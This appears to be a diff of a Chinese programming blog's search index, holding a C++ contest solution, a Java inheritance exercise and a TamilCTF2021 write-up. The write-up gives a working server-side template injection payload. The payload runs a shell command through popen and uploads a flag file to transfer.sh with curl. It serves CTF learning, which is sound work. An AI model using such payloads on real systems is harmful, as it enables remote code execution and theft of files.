-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span> <span class="params">(<span class="type">const</span> pair&lt;string,<span class="type">int</span>&gt;&amp; a,<span class="type">const</span> pair&lt;string,<span class="type">int</span>&gt;&amp; b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a.second!=b.second)</span><br><span class="line">        <span class="keyword">return</span> a.second&gt;b.second;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> a.first&lt;b.first;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;in.txt&quot;, &quot;r&quot;, stdin);</span></span><br><span class="line">    <span class="comment">//freopen(&quot;out.txt&quot;, &quot;w&quot;, stdout);</span></span><br><span class="line">    cin.<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="type">int</span> n,g,k;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;g&gt;&gt;k;</span><br><span class="line">    map&lt;string,<span class="type">int</span>&gt; m;</span><br><span class="line">    ll ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        string temp1;</span><br><span class="line">        <span class="type">int</span> temp2;</span><br><span class="line">        cin&gt;&gt;temp1&gt;&gt;temp2;</span><br><span class="line">        m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;string,<span class="type">int</span>&gt;(temp1,temp2));</span><br><span class="line">        <span class="keyword">if</span>(temp2&gt;=<span class="number">60</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(temp2&lt;g)</span><br><span class="line">                ans+=<span class="number">20</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                ans+=<span class="number">50</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    vector&lt;pair&lt;string,<span class="type">int</span>&gt;&gt; <span class="built_in">mm</span>(m.<span class="built_in">begin</span>(),m.<span class="built_in">end</span>());<span class="comment">//map转存至vector</span></span><br><span class="line">    <span class="built_in">sort</span>(mm.<span class="built_in">begin</span>(),mm.<span class="built_in">end</span>(),cmp);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> index=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> number=<span class="number">1</span>;</span><br><span class="line">    vector&lt;pair&lt;string,<span class="type">int</span>&gt;&gt;::iterator t=mm.<span class="built_in">begin</span>();</span><br><span class="line">    ll flag=(*t).second;</span><br><span class="line">    <span class="keyword">for</span>(t=mm.<span class="built_in">begin</span>();t!=mm.<span class="built_in">end</span>();t++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(flag!=(*t).second)</span><br><span class="line">        &#123;</span><br><span class="line">            flag=(*t).second;</span><br><span class="line">            index=number;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(index&gt;k)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        cout&lt;&lt;index&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;(*t).first&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;(*t).second&lt;&lt;endl;</span><br><span class="line">        number++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>比赛的时候没看清题意，上来就直接一个map，快写完了的时候才发现不对，然后就突发奇想的对map进行sort，但是编译的时候比较函数那一行一直报错。我到现在都不清楚为什么比赛的时候要一直死磕对map按照value进行sort，就是懒得改成结构体加vector，结果直到比赛结束前几分钟才开始改，虽然改完了可惜没时间交了。<br>回到宿舍终于在网上找到了对map进行sort的方法：将map转存至vector中，然后sort。<code>vector&lt;pair&lt;string,int&gt;&gt; mm(m.begin(),m.end());</code>但是还是用结构体加vector方便啊。<br>还是自己菜啊.......</p>
-<div class="note warning"><p>
-注意：STL库中的sort函数只能对线性存储的对象进行排序,如:vector、array、list、deque,不能对集合容器进行排序,如:set、map;
-</p></div>
-
-<p>参考博客:<a href="https://blog.csdn.net/iicy266/article/details/11906189">C++ STL中Map的按Key排序和按Value排序</a></p>
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <categories>
-        <category>ACM</category>
-      </categories>
-      <tags>
-        <tag>ACM</tag>
-        <tag>CCCC天梯赛</tag>
       </tags>
   </entry>
   <entry>
@@ -2776,6 +2776,31 @@ Path(&#39;a.png&#39;).write_bytes(data)
       </tags>
   </entry>
   <entry>
+    <title>TamilCTF2021 Writeup</title>
+    <url>/posts/2827311957/</url>
+    <content><![CDATA[<h1 id="Open-Flag"><a href="#Open-Flag" class="headerlink" title="Open Flag"></a>Open Flag</h1><hr>
+<p>访问题目中给出的链接,发现是一个登录页面<br><img data-src="../../CTF/TamilCTF2021/Web/images/login.png" alt="Open Flag" style="zoom:80%;" /><br>随便输入一个用户名和密码直接可以登录,提示我们flag文件的路径是<code>./flag.jpg</code>.<br>F12看源码发现注释中会显示刚才登录所用的用户名,猜测存在SSTI漏洞,直接用注入代码作为用户名登录即可<br><img data-src="../../CTF/TamilCTF2021/Web/images/image-20211119203608270.jpg" alt="image-20211119203608270" style="zoom:70%;" /></p>
+<p>使用下列代码作为用户名登录,查看当前已加载的模块;删掉HTML的注释标记<code>&lt;!--</code>,找到<code>os._wrap_close</code>模块所在的索引为132,借助于<code>popen</code>函数可以直接执行系统命令</p>
+<pre><code class="python">&#123;&#123;"".__class__.__bases__[0].__subclasses__()&#125;&#125;
+</code></pre>
+<p><img data-src="/../../CTF/TamilCTF2021/Web/images/image-20211119212248483.png" alt="image-20211119212248483"></p>
+<p>使用<code>curl</code>命令将<code>flag.jpg</code>文件上传至<a href="http://transfer.sh/">transfer.sh</a></p>
+<pre><code class="python">&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('curl --upload-file ./flag.jpg http://transfer.sh/flag.jpg').read()&#125;&#125;
+</code></pre>
+<p>在HTML注释中找到文件上传后的URL<code>http://transfer.sh/bDGBlw/flag.jpg</code><br><img data-src="/../../CTF/TamilCTF2021/Web/images/image-20211119204635015.png" alt="image-20211119204635015"></p>
+<img data-src="../../CTF/TamilCTF2021/Web/images/flag.jpg" alt="Open Flag" style="zoom:80%;" />
+
+<p><strong>flag:</strong><code>TamilCTF&#123;SsTi_Is_VeRy_DaNgErOuS&#125;</code></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>TamilCTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>TMUCTF2021 Writeup</title>
     <url>/posts/500717398/</url>
     <content><![CDATA[<h1 id="Puzzle"><a href="#Puzzle" class="headerlink" title="Puzzle"></a>Puzzle</h1><p><em>Life is a puzzle!</em></p>
@@ -3034,31 +3059,6 @@ im.save(&#39;ans.png&#39;)
       <tags>
         <tag>CTF</tag>
         <tag>TMUCTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>TamilCTF2021 Writeup</title>
-    <url>/posts/2827311957/</url>
-    <content><![CDATA[<h1 id="Open-Flag"><a href="#Open-Flag" class="headerlink" title="Open Flag"></a>Open Flag</h1><hr>
-<p>访问题目中给出的链接,发现是一个登录页面<br><img data-src="../../CTF/TamilCTF2021/Web/images/login.png" alt="Open Flag" style="zoom:80%;" /><br>随便输入一个用户名和密码直接可以登录,提示我们flag文件的路径是<code>./flag.jpg</code>.<br>F12看源码发现注释中会显示刚才登录所用的用户名,猜测存在SSTI漏洞,直接用注入代码作为用户名登录即可<br><img data-src="../../CTF/TamilCTF2021/Web/images/image-20211119203608270.jpg" alt="image-20211119203608270" style="zoom:70%;" /></p>
-<p>使用下列代码作为用户名登录,查看当前已加载的模块;删掉HTML的注释标记<code>&lt;!--</code>,找到<code>os._wrap_close</code>模块所在的索引为132,借助于<code>popen</code>函数可以直接执行系统命令</p>
-<pre><code class="python">&#123;&#123;"".__class__.__bases__[0].__subclasses__()&#125;&#125;
-</code></pre>
-<p><img data-src="/../../CTF/TamilCTF2021/Web/images/image-20211119212248483.png" alt="image-20211119212248483"></p>
-<p>使用<code>curl</code>命令将<code>flag.jpg</code>文件上传至<a href="http://transfer.sh/">transfer.sh</a></p>
-<pre><code class="python">&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('curl --upload-file ./flag.jpg http://transfer.sh/flag.jpg').read()&#125;&#125;
-</code></pre>
-<p>在HTML注释中找到文件上传后的URL<code>http://transfer.sh/bDGBlw/flag.jpg</code><br><img data-src="/../../CTF/TamilCTF2021/Web/images/image-20211119204635015.png" alt="image-20211119204635015"></p>
-<img data-src="../../CTF/TamilCTF2021/Web/images/flag.jpg" alt="Open Flag" style="zoom:80%;" />
-
-<p><strong>flag:</strong><code>TamilCTF&#123;SsTi_Is_VeRy_DaNgErOuS&#125;</code></p>
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>TamilCTF</tag>
       </tags>
   </entry>
   <entry>
@@ -4185,6 +4185,21 @@ END
       </tags>
   </entry>
   <entry>
+    <title>第四周编程题_实现一个表达MP3的媒体类型</title>
+    <url>/posts/46392/</url>
+    <content><![CDATA[<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p>本周我们介绍了以继承方式实现的媒体资料库，在课程代码实现的基础上，请实现一个表达MP3的媒体类型，能和CD、DVD一样存放进这个Database。请提交这个MP3类的代码。如果你认为为了能存放MP3，需要修改Item和Database，也请一并提交Item和Database的代码。</p>
+<span id="more"></span>
+<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 面向对象程序设计_Java语言_翁恺;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Item</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> String title;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> playTime;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">gotIt</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">private</span> String comment;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Item</span><span class="params">(String title, <span class="type">int</span> playTime, <span class="type">boolean</span> gotIt, String comment)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">this</span>.title = title;</span><br><span class="line">		<span class="built_in">this</span>.playTime = playTime;</span><br><span class="line">		<span class="built_in">this</span>.gotIt = gotIt;</span><br><span class="line">		<span class="built_in">this</span>.comment = comment;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		System.out.print(<span class="string">&quot;title:&quot;</span>+title+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;playTime:&quot;</span>+playTime+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;gotIt:&quot;</span>+gotIt+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;comment:&quot;</span>+comment+<span class="string">&quot;;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Mp3</span> <span class="keyword">extends</span> <span class="title class_">Item</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> String artist;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> numofTracks;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Mp3</span><span class="params">(String title, <span class="type">int</span> playTime, <span class="type">boolean</span> gotIt, String comment,String artist,<span class="type">int</span> numofTracks)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">super</span>(title, playTime, gotIt, comment);</span><br><span class="line">		<span class="built_in">this</span>.artist=artist;</span><br><span class="line">		<span class="built_in">this</span>.numofTracks=numofTracks;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		System.out.print(<span class="string">&quot;Mp3:&#123;&quot;</span>);</span><br><span class="line">		<span class="built_in">super</span>.print();</span><br><span class="line">		System.out.println(<span class="string">&quot;artist:&quot;</span>+artist+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;numofTracks:&quot;</span>+numofTracks+<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Database</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> ArrayList&lt;Item&gt; list=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Item&gt;();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Item item)</span></span><br><span class="line">	&#123;</span><br><span class="line">		list.add(item);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">list</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(Item item:list)</span><br><span class="line">			item.print();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		Database db=<span class="keyword">new</span> <span class="title class_">Database</span>();</span><br><span class="line">		db.add(<span class="keyword">new</span> <span class="title class_">Mp3</span>(<span class="string">&quot;A&quot;</span>, <span class="number">60</span>, <span class="literal">true</span>, <span class="string">&quot;good&quot;</span>, <span class="string">&quot;John&quot;</span>, <span class="number">20</span>));</span><br><span class="line">		db.add(<span class="keyword">new</span> <span class="title class_">Mp3</span>(<span class="string">&quot;B&quot;</span>, <span class="number">80</span>, <span class="literal">true</span>, <span class="string">&quot;vrey good&quot;</span>, <span class="string">&quot;Tom&quot;</span>, <span class="number">10</span>));</span><br><span class="line">		db.list();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="运行结果："><a href="#运行结果：" class="headerlink" title="运行结果："></a>运行结果：</h2><p><img data-src="/images/20170823002504047.jpg"></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>面向对象程序设计_Java语言_翁恺</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>第六周编程题_单词长度</title>
     <url>/posts/26108/</url>
     <content><![CDATA[<h2 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h2><p>你的程序要读入一行文本，其中以空格分隔为若干个单词，以‘.’结束。你要输出这行文本中每个单词的长度。这里的单词与语言无关，可以包括各种符号，比如“it&#39;s”算一个单词，长度为4。注意，行中可能出现连续的空格。</p>
@@ -4203,21 +4218,6 @@ END
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
         <category>零基础学Java语言_翁恺</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>第四周编程题_实现一个表达MP3的媒体类型</title>
-    <url>/posts/46392/</url>
-    <content><![CDATA[<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p>本周我们介绍了以继承方式实现的媒体资料库，在课程代码实现的基础上，请实现一个表达MP3的媒体类型，能和CD、DVD一样存放进这个Database。请提交这个MP3类的代码。如果你认为为了能存放MP3，需要修改Item和Database，也请一并提交Item和Database的代码。</p>
-<span id="more"></span>
-<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 面向对象程序设计_Java语言_翁恺;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Item</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> String title;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> playTime;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">gotIt</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">private</span> String comment;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Item</span><span class="params">(String title, <span class="type">int</span> playTime, <span class="type">boolean</span> gotIt, String comment)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">this</span>.title = title;</span><br><span class="line">		<span class="built_in">this</span>.playTime = playTime;</span><br><span class="line">		<span class="built_in">this</span>.gotIt = gotIt;</span><br><span class="line">		<span class="built_in">this</span>.comment = comment;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		System.out.print(<span class="string">&quot;title:&quot;</span>+title+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;playTime:&quot;</span>+playTime+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;gotIt:&quot;</span>+gotIt+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;comment:&quot;</span>+comment+<span class="string">&quot;;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Mp3</span> <span class="keyword">extends</span> <span class="title class_">Item</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> String artist;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> numofTracks;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Mp3</span><span class="params">(String title, <span class="type">int</span> playTime, <span class="type">boolean</span> gotIt, String comment,String artist,<span class="type">int</span> numofTracks)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">super</span>(title, playTime, gotIt, comment);</span><br><span class="line">		<span class="built_in">this</span>.artist=artist;</span><br><span class="line">		<span class="built_in">this</span>.numofTracks=numofTracks;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		System.out.print(<span class="string">&quot;Mp3:&#123;&quot;</span>);</span><br><span class="line">		<span class="built_in">super</span>.print();</span><br><span class="line">		System.out.println(<span class="string">&quot;artist:&quot;</span>+artist+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;numofTracks:&quot;</span>+numofTracks+<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Database</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> ArrayList&lt;Item&gt; list=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Item&gt;();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Item item)</span></span><br><span class="line">	&#123;</span><br><span class="line">		list.add(item);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">list</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(Item item:list)</span><br><span class="line">			item.print();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		Database db=<span class="keyword">new</span> <span class="title class_">Database</span>();</span><br><span class="line">		db.add(<span class="keyword">new</span> <span class="title class_">Mp3</span>(<span class="string">&quot;A&quot;</span>, <span class="number">60</span>, <span class="literal">true</span>, <span class="string">&quot;good&quot;</span>, <span class="string">&quot;John&quot;</span>, <span class="number">20</span>));</span><br><span class="line">		db.add(<span class="keyword">new</span> <span class="title class_">Mp3</span>(<span class="string">&quot;B&quot;</span>, <span class="number">80</span>, <span class="literal">true</span>, <span class="string">&quot;vrey good&quot;</span>, <span class="string">&quot;Tom&quot;</span>, <span class="number">10</span>));</span><br><span class="line">		db.list();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="运行结果："><a href="#运行结果：" class="headerlink" title="运行结果："></a>运行结果：</h2><p><img data-src="/images/20170823002504047.jpg"></p>
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <categories>
-        <category>面向对象程序设计_Java语言_翁恺</category>
       </categories>
       <tags>
         <tag>Java</tag>
